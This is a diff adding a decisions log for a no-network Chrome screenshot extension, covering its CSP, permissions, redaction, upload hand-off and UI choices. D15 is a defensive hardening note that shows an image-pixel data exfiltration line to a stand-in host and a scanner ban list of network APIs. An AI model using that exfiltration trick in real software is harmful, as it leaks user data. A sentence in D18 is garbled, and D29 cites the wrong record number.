@@ -1,0 +1,888 @@
+# Decisions
+
+Architecture decision records. Each one exists because the decision looks wrong, or
+merely arbitrary, without its reason, and someone (human or agent) will otherwise
+"fix" it.
+
+Format: context, decision, consequences. Newest last.
+
+## D1: No build step, no dependencies
+
+**Context.** The failure this project answers is an extension that changes hands and
+then ships something unwanted through a silent auto update. Users cannot tell,
+because nobody can diff a minified bundle against a repository.
+
+**Decision.** The shipped zip is byte identical to this repository. No bundler, no
+transpiler, no minifier, no npm packages, not even in tests.
+
+**Consequences.** Anything a library would give us is written by hand: the zip
+writer, the PNG writer and the PDF writer. Tests use Node's built in
+runner. The payoff is that `diff -r` against an installed extension is a complete
+audit, which no competitor can offer. This is the property everything else defends.
+
+## D2: `chrome.storage.local` only, never `sync`
+
+**Context.** Settings need to persist.
+
+**Decision.** Local storage only. `chrome.storage.sync` is banned by the invariants.
+
+**Consequences.** Settings do not follow the user between machines. In exchange, the
+extension never sends a byte to Google's servers, which is a network path it does not
+otherwise have.
+
+## D3: Permissions are asked for at the moment of use, not at install
+
+**Context.** Chrome only re-prompts users when permissions increase, so whatever is
+granted at install is granted forever, invisibly.
+
+**Decision.** `activeTab`, `scripting` and `storage` at install. `downloads` is
+requested on the first real Save click. `webNavigation` and `<all_urls>` are optional
+and requested only if the user ticks a settings box that states the cost in plain
+words.
+
+**Consequences.** The install prompt asks for no site access at all. The Save button
+needs a user gesture, which a popup-less toolbar click cannot supply, and that is one
+of the reasons the result opens in a tab rather than a popup.
+
+## D4: The result opens in a tab, and stitching happens there
+
+**Context.** The screenfuls have to be assembled somewhere. The conventional place is
+an offscreen document, which needs the `offscreen` permission.
+
+**Decision.** Stitch in the result tab.
+
+**Consequences.** One fewer permission, and Download and Copy are real clicks in a
+real page. The cost is that the worker holds the screenfuls until the tab connects.
+See [LIMITATIONS.md](LIMITATIONS.md).
+
+## D5: The editor keeps live objects, not baked strokes
+
+**Context.** The simplest annotation editor draws onto the image and keeps an undo
+stack of bitmaps.
+
+**Decision.** Shapes are objects in a list. History is a stack of whole snapshots.
+The original capture is never drawn into; every frame re-renders from it.
+
+**Consequences.** Selecting, moving, resizing and restyling after the fact all work,
+which is the convention in annotation tools and what people expect. Undo is
+exact and repeated edits never degrade the image. The cost is that export has to
+flatten, and that redaction needs care (see D6).
+
+## D6: Redaction is destructive on purpose
+
+**Context.** A blur laid over recoverable pixels in a layered file is not redaction,
+it is a rumour.
+
+**Decision.** Pixelate resamples coarsely from the original and paints it back, and
+the export is a flat PNG or JPEG with no layer underneath.
+
+**Consequences.** Redaction in the saved file is real. Adding any layered export
+format (a PSD, an SVG with the original embedded) would silently break this, so it
+requires revisiting this record first.
+
+## D7: Coordinates are in original capture pixels, always
+
+**Context.** The editor shows a cropped, CSS-scaled view of a large image.
+
+**Decision.** Every stored coordinate is in pixels of the original capture. The view
+transform is applied at render time and reversed in `toImage()`.
+
+**Consequences.** Cropping twice, or cropping and undoing, moves nothing. Zoom
+(F6) is cheap because the pointer maths already divide by the rendered box size.
+
+## D8: Prefer downscaling over truncation on long pages
+
+**Context.** Chrome refuses canvases larger than 16384px on a side, and a long page
+at retina scale exceeds that quickly.
+
+**Decision.** The planner lowers `outputScale` down to a floor of 0.5 before cutting
+anything, and the result tab says which happened.
+
+**Consequences.** A very long page comes back complete but softer rather than sharp
+and cut in half. Below half resolution the image would be useless, so past that point
+truncation is the honest outcome. Multi part export (F10) is the real fix and it
+retires this compromise.
+
+## D9: The toolbar button captures immediately, with no popup
+
+**Context.** Most competitors open a popup with a menu of capture modes.
+
+**Decision.** One click captures. `default_popup` is empty in the manifest and is set
+only for the duration of a capture, so a second click during a capture shows progress
+instead of doing nothing. Extra modes are opt in and off by default.
+
+**Consequences.** The common case is one click. The progress indicator has to be
+browser chrome (the icon badge and the popup panel) rather than an overlay drawn into
+the page, because the page is what we are photographing.
+
+## D10: `sanitise()` rebuilds settings from `DEFAULTS` and drops unknown keys
+
+**Context.** Storage is user writable in principle, so what comes back out cannot be
+trusted.
+
+**Decision.** `sanitise()` starts from a copy of `DEFAULTS` and copies across only
+keys it recognises, after validating each one.
+
+**Consequences.** Hostile stored values cannot reach the UI. The trap: a new setting
+added to `DEFAULTS` but not to `sanitise()`, or the reverse, is silently written
+nowhere. Every setting change must touch both. This is item 4 in the definition of
+done in [../AGENTS.md](../AGENTS.md).
+
+## D11: Permissions are never mirrored into settings
+
+**Context.** It would be convenient to store "the user turned on advanced access".
+
+**Decision.** `chrome.permissions.contains()` is the only source of truth.
+
+**Consequences.** No stored flag can disagree with reality after the user revokes
+access in `chrome://extensions`, and a disagreement would always have favoured us.
+
+## D12: `nextId` in `src/lib/edit.js` is module state, and that is fine
+
+**Context.** Shape ids come from a module level counter, shared by every document in
+a tab. Multi part export (F10) will put more than one document in a tab.
+
+**Decision.** Keep it. Ids only need to be unique within a document, and a shared
+counter satisfies that trivially.
+
+**Consequences.** Ids are not dense per document, which nothing depends on. Recorded
+so it is not "fixed" into a per document counter by someone who reads a gap in the
+numbering as a bug.
+
+## D13: `system-ui` is the interface font, and it is not a design failure
+
+**Context.** Design guidance widely treats a system font stack as the "gave up on
+typography" signal.
+
+**Decision.** The UI uses `system-ui` and will keep doing so.
+
+**Consequences.** A webfont is a network request, which the CSP forbids outright. A
+self hosted typeface would have to ship as a binary in the repository, inflating the
+auditable surface for decoration. The system stack here is a consequence of the
+security model, not laziness, so typographic quality has to come from weight,
+tracking and scale instead. Recorded so no future design pass "fixes" it.
+
+## D14: Apply and Discard staging was considered and rejected
+
+**Context.** The competitor stages edits until the user presses Apply, and their
+locale strings contain five separate "you have unapplied edits" dialogs.
+
+**Decision.** Not adopted. The live object model already makes every edit reversible,
+so staging would add a mode the model does not need. What is adopted instead is the
+part of it that was actually load bearing: a warning when the tab holds unsaved edits
+and the user tries to close it.
+
+**Consequences.** No Apply button, no pending state, no dialogs. The data loss the
+staging model protects against is handled by a `beforeunload` guard (task T10).
+Maintainer decision, 2026-09-08.
+
+## D15: The CSP gets a floor, not just a `connect-src`
+
+**Context.** The manifest sets
+`script-src 'self'; object-src 'none'; connect-src 'none'; frame-src 'none'`.
+`connect-src 'none'` blocks `fetch`, `XMLHttpRequest`, WebSocket and
+`navigator.sendBeacon`, and `test/lib/scan.js` bans those four names by pattern.
+
+Studying a competitor's "watermark from an image URL" feature exposed the gap. In
+CSP, a directive that is absent **and** has no `default-src` to fall back on is
+unrestricted. Our policy names no `default-src`, so `img-src`, `style-src`,
+`font-src` and `media-src` are wide open. `new Image().src = 'https://x/?d=' + data`
+is a network request, it is not blocked by the policy, and it is not caught by the
+scanner.
+
+**Decision.** Name every directive:
+
+```
+script-src 'self'; object-src 'none'; connect-src 'none'; frame-src 'none';
+img-src 'self' data: blob:; style-src 'self' 'unsafe-inline'; font-src 'self';
+media-src 'none'; base-uri 'none'; form-action 'none'
+```
+
+`style-src 'unsafe-inline'` is required because both extension pages carry inline
+`<style>` blocks. `data:` and `blob:` are required because that is how captured
+tiles and exported images move around. Add a scanner rule for remote subresource
+assignment, and an invariant test asserting each directive is present.
+
+**Consequences.** The README's claim that Chrome enforces "no network access" becomes
+literally true rather than nearly true. A future contributor cannot exfiltrate with
+an image pixel. Verify the pages still render before shipping: a wrong `style-src`
+blanks the UI.
+
+## D16: We hand images off. We never upload them.
+
+**Context.** A share or upload button next to Download was requested, for hosts like
+Imgur, ImgBB and Google Photos.
+
+The obstacle is not effort, it is that **an extension's content security policy is
+static in the manifest**. There is no API to add a `connect-src` allowance when a
+user turns a setting on. Shipping a direct API upload means the allowance sits in
+the published manifest for every user forever, including everyone who never uploads,
+and every future audit stops asking *whether* the extension can send data and starts
+asking *what* it sends. That is a different product.
+
+**Decision.** Three tiers, and we ship the first.
+
+**Tier 0, hand off (F25, Phase 2).** The extension writes the PNG to the clipboard,
+which it already does and which needs no permission, then opens the chosen host's
+upload page in a new tab. The user pastes. ImgBB, Postimages, Catbox and Imgur all
+accept a pasted image on their upload page. The extension makes **zero** network
+requests; the site the user chose makes them, in a tab they can see.
+
+**Tier 1, assisted hand-off (Phase 4 at the earliest, not committed).** With an
+optional host permission for one chosen host, granted at click time and revocable,
+inject the image into that page's file input with a `DataTransfer` so no paste is
+needed. The extension still issues no request. Open question: moving a 10 to 30MB
+blob into a content script means base64 through message passing, which is ugly and
+has limits.
+
+**Tier 2, direct API upload. Refused.** It would require `connect-src` entries in
+the shipped manifest, and for ImgBB or Imgur an API key. A key committed to an
+open-source repository is a public credential we would be answerable for, shared by
+every user, and revoked the first time someone abuses it.
+
+**Also decided:** if a link is offered, **default to an expiring one**. A full-page
+capture of a logged-in page on a permanent public URL is a privacy accident waiting
+to happen, and unlisted is not private. Litterbox (Catbox's temporary variant) takes
+an expiry of 1, 12, 24 or 72 hours with no account at all.
+
+**Google Photos specifically:** since 31 March 2025 the Library API only manages
+media the calling app itself created, and upload needs the
+`photoslibrary.appendonly` scope over OAuth. That means the `identity` permission,
+a Google Cloud project, an OAuth client in the manifest and Google's app
+verification. It is the heaviest option on the list and it is Tier 2 shaped, so it
+is refused with the rest. Drag and drop into the Google Photos tab still works.
+
+**Consequences.** Sharing costs one keystroke. In exchange the sentence "this
+extension cannot send your capture anywhere" stays true, which is the sentence the
+whole product is built on.
+
+## D17: The toolbar is configured, not collapsed
+
+**Context.** The editor toolbar holds 26 controls in one wrapping row and the
+backlog adds more. A design review proposed collapsing the six colour swatches and
+three width buttons into two dropdowns, and a before-and-after preview was built for
+the decision.
+
+**Decision.** Rejected in favour of the maintainer's alternative: **every tool and
+action gets an on/off switch on the options page** (F24), with a curated default set
+on and the rest off.
+
+**Consequences.** Nobody pays a permanent extra click for a problem they may not
+have, which is what collapsing would have cost the people who change colour often.
+The six circular swatches stay visible by default. Two new obligations come with it:
+the default set has to be genuinely good, because most people never open settings,
+and a hidden tool must still be reachable, which is one of the arguments for the
+command palette (F18). F24 must land before any release that adds toolbar controls.
+Decided 2026-09-09.
+
+## D18: The toolbar follows Preview's grouping model
+
+**Context.** D17 settled that the toolbar is configured rather than collapsed. It did
+not settle how the controls that remain are arranged. Four screenshots of macOS
+Preview's markup toolbar, provided 2026-09-09, answer that.
+
+Preview exposes roughly sixty controls through **thirteen buttons**:
+
+- **Every button carries a small chevron.** Clicking the button uses the tool or
+  applies the current value; clicking the chevron opens a popover holding the whole
+  related set.
+- **The button's glyph is its current state.** The border colour button *is* a
+  swatch of the current colour. The fill button shows a diagonal slash when fill is
+  off. The shape style button draws the current stroke weight.
+- **Related settings are grouped by concept, not by widget type.** One "Shape Style"
+  popover holds five stroke weights, two dash patterns, three arrow endings and a
+  shadow toggle. One "Text Style" popover holds family, size, colour, bold, italic,
+  underline and four alignments.
+- **Heavy tools get a floating inspector, not a popover.** Adjust Colour opens a
+  panel with a live histogram, nine sliders, Auto Levels and Reset All.
+- **The whole markup row is itself hidden** behind one button in the window toolbar.
+
+**Decision.** Adopt the pattern. The editor toolbar becomes roughly eighteen buttons:
+Select, Shapes (box, ellipse, line, arrow, highlight behind one chevron), Draw, Text,
+Step, Redact, Crop, Style, Colour, Zoom, then the history group, then the output
+group. Every grouped button shows its current value as its glyph and remembers the
+last choice, so repeated use stays one click. Keyboard shortcuts stay bound to the
+individual tools, unchanged, so grouping costs a mouse click and never a keystroke.
+Phase 3's adjustments become a floating inspector rather than more toolbar buttons.
+
+**Consequences.** Nineteen buttons carry sixty eight controls where today's twenty six carry twenty six
+carry, which is what makes room for Phases 2 to 4 without a second toolbar row. The
+cost is one extra click to switch between shapes that currently sit side by side, and
+that cost falls only on the mouse, which is the trade Apple made in the same
+situation. D17 still holds: the options page can hide any of the nineteen.
+
+## D19: Selection chrome is drawn in screen space, shape geometry in image space
+
+**Date.** 2026-09-09.
+
+**Decision.** Anything the editor draws *about* a shape rather than *as part of* it,
+meaning selection outlines, resize handles, hover outlines and snap guides, is sized in
+screen pixels and divided by the current display factor before it is drawn. Everything
+that is part of the image, meaning stroke widths, font sizes and shape geometry, stays
+in image pixels and scales with the capture.
+
+**Why.** The two kinds of drawing have opposite requirements and the code did not
+separate them. A 4px stroke must stay 4px in the exported PNG whatever the zoom. A 9px
+handle must stay 9px under the user's finger whatever the zoom. `drawSelection()` drew
+both in image pixels, so on a 14,000px capture fitted to the window at roughly 12%, its
+nine pixel handles rendered at one pixel and its 1.5px dashed outline rendered at 0.18
+of a pixel, which is to say not at all.
+
+**The evidence that this was a defect and not a design choice.** `pickTolerance()`, three
+functions away in the same file, already divides by that same display factor. The hit
+target was corrected for zoom and the drawing was never corrected with it, which is why
+the handles on a long capture can be grabbed but not seen.
+
+**Rejected: handles proportional to the image.** That is the same bug pointing the other
+way. On a 14,000px capture the handles would be enormous, and on a small one they would
+vanish. Every general purpose editor holds the handle at a constant size on
+screen. Constant on screen is what the user was asking for.
+
+**Consequences.** One helper, `screenScale()`, is the only place that knows the display
+factor, and both the drawing and the hit test read it. This matters more once F6 lands
+zoom, because the factor then varies continuously rather than only with capture length.
+The task is T20 and it ships in 1.7.0, ahead of the toolbar, because it is a repair.
+
+## D20: The custom colour is the operating system's picker, not one we drew
+
+**Date.** 2026-09-09.
+
+**Decision.** The custom swatch at the bottom of the Border and Fill popovers is a
+native `<input type="color">` next to a hex text field. It is not a hand-drawn
+saturation square with a hue slider, which is what the preview sketched.
+
+**Why.** Preview's own *Show Colours…* opens the macOS system colour panel rather
+than a picker Apple drew inside Preview. Copying the pattern properly therefore
+means opening the platform picker, and doing so gets three things we would
+otherwise have to build and would build worse: an eyedropper that can sample any
+pixel on the screen, full keyboard operation, and the recent-colours list the user
+already has from every other application.
+
+**What the hex field adds.** The one thing the native picker is poor at is pasting
+a brand colour from a style guide. The text field takes `#4338CA` or `4338ca`,
+normalises it, and puts the previous value back if what was typed is not a colour.
+That is the case the picker does not cover, and it is the common one at work.
+
+**Rejected: an inline spectrum.** It is around 120 lines of pointer maths, it needs
+its own focus handling and ARIA to be usable by keyboard, it has no eyedropper, and
+it would be a worse version of a control the operating system ships. If the inline
+panel is wanted later for visual consistency across platforms, it replaces the
+`<input type="color">` and nothing else changes.
+
+## D21: Text alignment waits for multi-line text
+
+**Date.** 2026-09-09.
+
+**Decision.** The text inspector ships family, size, bold, italic and underline.
+Alignment, which the preview showed, is not in it.
+
+Colour is not in it either, and that is a second decision hiding inside the first.
+Text takes the border colour, the same control every other shape takes its stroke
+from, because a second colour picker that happens to apply only to text is one more
+place for the two to disagree. The inspector says where the colour comes from
+rather than leaving the reader to find out.
+
+**Why.** Alignment describes how lines sit relative to each other, and the inline
+text editor is a single-line `<input>`. Shipping the control now would mean four
+buttons that provably cannot change anything, which is worse than the gap: a
+control that does nothing teaches people not to trust the toolbar.
+
+**When it lands.** With multi-line text entry, which is its own piece of work
+because of L17: the entry box is positioned once from the canvas bounding box, and
+growing it to a `<textarea>` interacts with both that and with Enter, which
+currently commits. The inspector has a line saying so, rather than staying silent.
+
+## D22: The mark is a caricature of a camera, on a disc
+
+**Date.** 2026-09-09.
+
+**Decision.** A retro camera with an oversized lens, cream on a teal disc. Teal, not
+indigo, and specifically not violet.
+
+**Why a caricature.** A correctly proportioned camera is a picture of a camera and
+looks like every other one. A camera that is mostly lens is a character. It also
+survives the only rendering that matters: at 16px the lens is the single mass that
+still reads, and the two bumps on the top edge are what stop the body being a
+suitcase.
+
+**Why a disc.** Every other extension in the toolbar is a rounded square. A circle
+is the one silhouette that is not.
+
+**Why teal.** It has to hold against both the light (#F1F3F4) and dark (#292A2D)
+Chrome toolbars, which rules out anything pale and anything near black. It also
+leaves amber free, and amber means one thing in this product: a capture is running.
+
+**What was rejected, so it is not redrawn.** Four crop marks around a narrow page,
+which put five elements inside sixteen pixels and lost all of them. A folded sheet
+of paper, which read cleanly but said "document". A version of that bleeding off the
+top edge, which left the tile as two uprights and a floor and read as a letter U. A
+monoline camera and a ringed badge, both of which dissolved at 16px. An aperture of
+six blades, which read as a star. A cream disc with the camera cut out of it, which
+disappeared into the light Chrome toolbar. All six are kept as images in the logo
+options folder outside the repository.
+
+**Consequence, still open.** The extension interface is still indigo. A teal mark on
+an indigo interface is incoherent, but recolouring the interface is a visible change
+and the standing agreement is that those need a before and after preview first.
+
+## D23: Rendered-page checks, because property assertions lied
+
+**Date.** 2026-09-09.
+
+**Decision.** `test/e2e/page-audit.js` asks the browser what it actually drew, and
+runs on the result tab and the options page on every end-to-end run.
+
+**Why.** Three CSS specificity collisions shipped in a single day. Every one of them
+had correct JavaScript, and one of them had a passing test: the popover check read
+`element.hidden`, which was set correctly the whole time, while a `display: flex`
+rule of equal specificity further down the stylesheet meant the popover never
+actually hid. The property was right and the pixels were wrong.
+
+**What it measures.** Contrast of every visible label against the colour genuinely
+painted behind it, content wider than the window that is not inside a scroll
+container, broken images, and skipped heading levels.
+
+**What it found on its first run.** Four real defects, none of which any existing
+test could have seen: an accent that never lifted in the dark theme, a button whose
+text colour did not invert with its background, links at 4.25:1, and dead CSS.
+
+**Consequence.** Point 7 of the definition of done. A change to an interface is not
+finished until the browser agrees.
+
+## D24: Settings travel as a file the user carries
+
+**Date.** 2026-09-09.
+
+**Decision.** The options page exports settings as JSON and imports them back.
+
+**Why.** D2 bans the synced storage area, so settings deliberately do not follow
+anyone between machines. That is a real cost and pretending otherwise would be
+dishonest. A file is the honest replacement: it moves the same data, the user can
+read it first, and it goes nowhere they did not put it.
+
+**Why import is safe.** It goes through the same `sanitise()` that every read from
+storage already goes through, because storage was always treated as untrusted.
+Unknown keys are dropped and every value is clamped, so a hand-edited or hostile
+file cannot introduce a setting we do not know or a value outside its range. The
+page says how many entries it ignored rather than silently discarding them.
+
+## D25: Feedback composes an email, it does not post one
+
+**Date.** 2026-09-09.
+
+**Decision.** The support form on the options page builds a `mailto:` and opens the
+user's own mail application. It does not submit anywhere.
+
+**Why.** Posting a form needs network access, and the extension has none. This is
+not a workaround, it is the only design consistent with the first rule: nothing
+leaves the page until the person presses send in their own client, under their own
+account, having read what they are sending.
+
+**Diagnostics are shown, not hidden.** The optional "include your version and
+settings" block is printed in full on the page before anything is composed. A
+diagnostics blob nobody can read is exactly the pattern this project exists to
+avoid. It carries the extension and browser version, the platform, whether the
+optional permission is granted, and the settings. No page addresses and nothing
+about what has been captured.
+
+**What changes when a mail service is added later.** Nothing in the extension. A
+service would receive mail at the support address; it would not give the extension
+a network path it does not have.
+
+## D26: Upload is a hand-off, and it shipped that way
+
+**Date.** 2026-09-09. Implements D16.
+
+**Decision.** The Upload button copies the image to the clipboard and opens the
+chosen host in a new tab. The extension performs no upload.
+
+**Why not a real upload.** An extension's content security policy is static, in the
+manifest. A `connect-src` allowance for an image host would therefore ship
+permanently, to every user, including everyone who never uploads. From that moment
+"this extension cannot send your capture anywhere" would be false, and every future
+audit would stop asking whether it can send data and start asking what it sends.
+
+**Hosts, and why these three.** ImgBB for the largest anonymous free cap and
+optional expiring links, Postimages for direct links without an account, and
+Litterbox because it is anonymous and deletes itself after 1 to 72 hours. A full
+page capture of a logged-in page on a permanent public URL is a privacy accident,
+so an expiring option is deliberately present.
+
+**The popover says so.** In as many words: the extension does not upload anything
+and cannot.
+
+## D27: Every step that crosses into a page has a deadline
+
+**Date.** 2026-09-09.
+
+**Decision.** No `await` in the capture orchestration may wait indefinitely.
+`chrome.scripting.executeScript`, `chrome.tabs.create` and the page restore are
+each wrapped in `withTimeout`. A step that times out *after* the walk has begun
+ends the walk and delivers what was captured; only a step that times out before
+anything is in hand fails the capture.
+
+**Why.** The screenfuls are held in the service worker until the walk finishes,
+which is what lets the result tab open on a finished capture rather than an empty
+one (see the header of `src/background.js`). The cost of that choice is that one
+step which never settles destroys every screenful taken so far, silently: the
+toolbar icon reads 100%, the panel reads "Screen 11 of 11", and nothing ever
+opens.
+
+That was a real report, not a hypothesis. It happens on pages whose scripts never
+go quiet, where an advertising frame keeps the tab busy and
+`executeScript({ allFrames: true })` never resolves because Chrome waits for every
+frame. `restorePage` runs in all frames on every single capture, so the wedge sat
+directly between the last screenful and the result tab.
+
+**Why bounded rather than avoided.** The alternative is to stop scripting frames
+we do not control, and that is what makes sticky headers appear once and scroll
+position come back. The behaviour is worth keeping; waiting forever for it is not.
+
+**Why a stalled walk still delivers.** A short image of a page is useful. No image
+of a page is not, and the user cannot tell the difference between "still going"
+and "will never finish" from the outside. The result tab says which happened.
+
+## D28: The progress panel can be told to finish now
+
+**Date.** 2026-09-09. Depends on D27.
+
+**Decision.** Once a screenful has landed, the progress popup shows a Finish now
+button. It sets a flag; the walk reads it between screenfuls and, on a wide page,
+only at the start of a row. The capture is delivered short, trimmed to the part
+that was reached, and says so.
+
+**Why.** Some pages never stop growing. A feed appends as fast as it is
+photographed; a page can be complete to the reader and still loading forever as far
+as the extension can tell. Re-planning after each screenful (which is what stops a
+lazily-loaded page being cut off) means the walk follows the growth. There is no
+heuristic that separates "nearly done" from "will never be done", so the reader
+decides.
+
+**Why not a cancel button.** Cancelling throws the work away, which is the outcome
+the user was already stuck with. Finishing keeps it.
+
+**Why hidden until the first screenful.** A button offering to finish a capture
+that has captured nothing would hand back an empty image.
+
+**Why the canvas is trimmed.** The plan sized a canvas for the whole page. Handing
+that over unchanged produces an image as tall as the page with everything below the
+stop left blank, which reads as a broken capture rather than a short one.
+
+## D29: Saving straight to a file is opt-in and asks for the permission up front
+
+**Date.** 2026-09-09.
+
+**Decision.** A setting sends the finished capture to the downloads folder and
+closes the tab it was written from, with no editor. It is off by default. The
+options page requests the `downloads` permission at the moment the switch is turned
+on, and refuses to store the setting if that is declined.
+
+**Why the permission is asked there.** `chrome.permissions.request` needs a user
+gesture. The whole point of this mode is that there is no click after the toolbar
+button, so the click has to be the one that turns the setting on. The result tab
+checks with `permissions.contains` rather than asking, and falls back to showing
+the editor if the answer is no. A switch that reads as on and silently opens the
+editor anyway would be worse than not having it.
+
+**Why the tab exists at all.** Stitching happens in a page, because doing it in the
+background would need the `offscreen` permission (D6). So a capture always has a
+tab; this mode opens it in the background, saves from it, and closes it.
+
+**Why it waits for the download.** The file is read from a blob URL owned by that
+document. Closing the tab before Chrome has finished reading it truncates the file.
+It waits for `downloads.onChanged` to report the download settled, and closes anyway
+after fifteen seconds: an extra tab is recoverable, a half-written file is not.
+
+## D30: A crop is proposed, not applied
+
+**Date.** 2026-09-09.
+
+**Decision.** Dragging with the crop tool draws a region and stops there. The
+region dims everything outside it, carries eight handles and can be slid whole,
+and a bar with a tick and a cross applies or abandons it. Enter and Escape do the
+same. Nothing is committed until the tick.
+
+**Why.** Cropping was the one destructive edit in the editor and the only one with
+no chance to look at it first: it happened on pointerup, at whatever rectangle the
+mouse released on. Undo could put it back, but "draw it again, more carefully" is
+not a fine-tune, and on a capture displayed at eight per cent a few pixels of
+pointer travel is a hundred pixels of image.
+
+**Why the bar is a real element and not drawn on the canvas.** Three reasons. It
+is a button, so it gets focus, hover, a name and a keyboard. It can be positioned
+against the viewport rather than the image. And it does not have to be hit tested
+in canvas coordinates, which for a control that must stay a constant size on
+screen means undoing the display scale twice.
+
+**Why it is fixed to the viewport.** A capture is often ten screens tall. Judging
+the edges of a crop means scrolling, and a button anchored to the region is off
+screen exactly when it is wanted. It sits below the region when there is room,
+above it when there is not, and inside the window when the region is bigger than
+the window.
+
+**Why cancelling leaves no undo step.** Nothing was committed, so there is nothing
+to undo. A cancelled crop that consumed a Cmd+Z would be worse than no cancel.
+
+**What still does not happen.** Exporting while a region is pending exports the
+uncropped image. The region is a proposal and applying it is one keystroke; making
+export silently apply it would be a different, larger surprise.
+
+## D31: PDF is written by hand, losslessly, and paginated
+
+**Date.** 2026-09-09.
+
+**Decision.** `src/lib/pdf.js` writes a small subset of PDF 1.4 directly: a
+catalogue, a page tree, and one Flate-compressed RGB image per page. The image is
+cut into pages of its own width, with no scaling and no margins.
+
+**Why by hand.** Rule 3. A PDF library is a dependency and a build step, and the
+subset needed to put a screenshot in a PDF is about a hundred lines.
+
+**Why not JPEG, which PDF supports directly.** `/DCTDecode` would have been a
+dozen lines. This tool photographs text, JPEG rings around every glyph edge, and a
+PDF of a screenshot that softens the text is a worse artefact than the PNG it was
+meant to replace. Raw RGB through `/FlateDecode` is lossless, and deflate is
+available to the page as `CompressionStream`, which costs the package nothing.
+
+**Why pages rather than one long one.** A full page capture is often ten screens
+tall. One page that shape is valid PDF and useless: readers open it at four per
+cent and it cannot be printed. Acrobat also refuses a page longer than 200 inches.
+
+**Why the height is divided evenly rather than taken off the top.** Walking down in
+full pages leaves the remainder on the last one, which for a 1700 pixel image at an
+849 pixel step is a page two pixels tall. The count is decided first and the height
+divided across it, so no page is a sliver.
+
+**Why no creation date.** The only thing a timestamp adds to a file the user is
+about to share is the moment they took the screenshot. `/Producer` is kept, because
+provenance is the point of this project; `/CreationDate` is not.
+
+## D32: The theme has three states, and the third one is not a colour
+
+**Date.** 2026-09-09.
+
+**Decision.** `system`, `light`, `dark`, on one toolbar button that rotates through
+them and on the settings page as a list. `system` is the default and stamps no
+`data-theme` attribute at all, so the stylesheets fall through to
+`prefers-color-scheme`.
+
+**Why that matters.** A `system` that stamps light is the bug nobody notices until
+their machine switches to dark in the evening and the extension does not. It is
+also why every dark token is written twice, once behind the media query guarded as
+`:root:not([data-theme="light"])` and once behind `:root[data-theme="dark"]`: an
+explicit choice has to beat the operating system in both directions.
+
+**The flash is accepted.** The choice lives in `chrome.storage`, which is
+asynchronous, and the content security policy forbids an inline script, so the
+attribute cannot be stamped before the first paint. A user who has overridden the
+system theme sees the system one for a frame. The alternative is permitting inline
+script on every page forever, to save one frame.
+
+**Why the settings page carries it too.** The toolbar button can be switched off
+like every other toolbar control, and a setting reachable only from a button you
+can hide is a setting you can lose.
+
+## D33: Reset does the obvious thing for where you are
+
+**Date.** 2026-09-09.
+
+**Decision.** The button formerly called Revert is called Reset. With edits on the
+canvas it removes them, which is what it always did. With none, it puts the drawing
+style back to the shipped defaults: the tool, the colours, the stroke, the fill and
+the type.
+
+**Why the second behaviour exists.** Those choices are remembered between captures
+on purpose, so that picking red and a seven pixel stroke once means the next
+capture opens on red and seven pixels. Anything remembered forever needs a way
+back, and there was none.
+
+**Why one button and not two.** A second button that is disabled whenever the first
+is enabled is two controls occupying one slot and explaining nothing. A fresh
+capture is the one moment when "reset" cannot mean anything else, so that is when
+it means the other thing. The tooltip says which it will do.
+
+**What it deliberately does not touch.** The output format, which toolbar controls
+are showing, the theme, and the capture settings. Those are separate choices and
+sweeping them up would be a surprise, which is the one thing a reset button must
+never be. `STYLE_KEYS` in `src/lib/settings.js` names exactly what it restores, and
+a test asserts the rest are not in it.
+
+**Why the internal name stayed `revert`.** The element id and the `hiddenButtons`
+entry are both `revert`. Renaming them would silently un-hide the button for
+anyone who had hidden it, which is a worse outcome than an id that does not match
+its label.
+
+## D34: What this repository names, and what it does not
+
+**Date.** 2026-09-09. Taken when the repository was opened to the public.
+
+**Decision.** Three rules.
+
+1. **Nothing a reader meets names another product.** `src/` and `manifest.json` are
+   scanned for a list of product names and CI fails if one appears, and so are
+   `docs/`, `store/`, `tools/` and the Markdown at the root. Design conventions are
+   described as conventions, because that is what they are and nobody owns them.
+
+   The prose was added to the scan on 2026-09-09, one day after the rule was
+   written, because cleaning only `src/` had moved the problem rather than solved
+   it. The names and the claims were still sitting in a working note, a deferred
+   task and a roadmap row, which is where a reader who cares would look first.
+2. **Claims about identifiable competitors are removed unless they are sourced.**
+   This repository asserted, in several files, that a named extension was delisted
+   on a particular date and that another was a security counter-example. Both may
+   well be true; neither was sourced here. The lesson each one carried is kept, the
+   identification is not.
+3. **`NOTICE.md` is the exception and stays exactly as it is.** The MIT licence of
+   the work this is derived from requires the attribution, and the disclaimer of
+   association with any commercial successor is protective rather than risky:
+   naming a mark in order to say you are not it is what a disclaimer is.
+
+**Why, given that naming a competitor factually is lawful.** Because this is
+hygiene, not law. Comparing products by name is ordinary and legal; a comment in
+shipped code saying a control was taken from a named product is the document you
+least want to own in a dispute, whatever the code actually does. It also costs
+nothing to avoid, and the neutral phrasing is usually more accurate: the convention
+belongs to the category, not to whoever we happened to look at.
+
+**What this did not fix on its own.** Git history. Every sentence removed here was
+still in the commit that added it, and making a repository public publishes its
+history. That was left as the maintainer's decision, and it was taken the next day:
+see D35.
+
+**Not legal advice.** This is a set of engineering conventions decided by the
+maintainer. Nobody here is a lawyer.
+
+## D35: The history was rebuilt before the repository was published
+
+**Date.** 2026-09-09. Taken immediately before the repository was made public.
+
+**Context.** D34 removed a set of claims from the working tree and said plainly that
+git history still carried every one of them. Twenty two commits, one author, no
+forks, no published tags, no open pull requests, and nobody but the maintainer had
+ever cloned it. The claims removed were the kind whose whole problem is that they
+are readable: an assertion that a named extension shipped malware, install counts
+repeated from news coverage, a path to a competitor's unpacked extension on the
+maintainer's disk.
+
+**Decision.** Rebuild the history from the sanitised tree, as a single commit, and
+publish that. The alternative considered was a text replacement across all twenty
+two commits with `git filter-repo`, which keeps the development narrative.
+
+**Why the narrative lost.** Two reasons, and the second is the real one.
+
+A replacement pass has to enumerate every phrasing of every claim across twenty two
+commits, and it takes only one variant spelled differently to leave the thing you
+were removing in the published history. A squash has no long tail: what is published
+is exactly the tree that was reviewed.
+
+And the narrative was worth less than it looks. This project's auditability claim is
+"the shipped zip is byte identical to this repository", which is a statement about
+one tree and rests on git history not at all. A first public commit is the ordinary
+shape of a first public release, and the development record that actually matters is
+`CHANGELOG.md` and this file, both of which are in the tree and survive intact.
+
+**Consequences.** Every commit hash before the rebuild is gone, and the remote was
+force pushed, which is destructive and was done once, deliberately, with the
+maintainer's explicit instruction. `git blame` now dates everything to one day, so
+this file and the changelog are the only record of when a decision was actually
+taken, which raises rather than lowers the cost of not writing one down. From this
+commit onward the history is append only: it is public, and rewriting published
